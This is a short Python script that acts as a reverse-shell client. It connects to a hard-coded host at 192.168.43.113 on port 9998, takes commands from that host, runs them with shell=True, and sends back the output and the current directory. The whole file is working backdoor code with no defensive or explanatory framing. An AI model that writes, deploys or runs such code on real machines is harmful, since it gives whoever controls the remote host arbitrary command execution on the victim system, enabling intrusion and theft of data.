import socket
import os
import subprocess

s = socket.socket()

host = '192.168.43.113'
port = 9998

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode('utf-8') == "cd":
        os.chdir(data[3:].decode('utf-8'))  #cd command
    if len(data) > 0:
        cmd = subprocess.Popen(data.decode('utf-8'),shell = True, stdout = subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)#to store all output input and errors
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, 'utf-8')
        currentWD = os.getcwd() + '>'
        s.send((output_str + currentWD).encode())

        print(output_str)
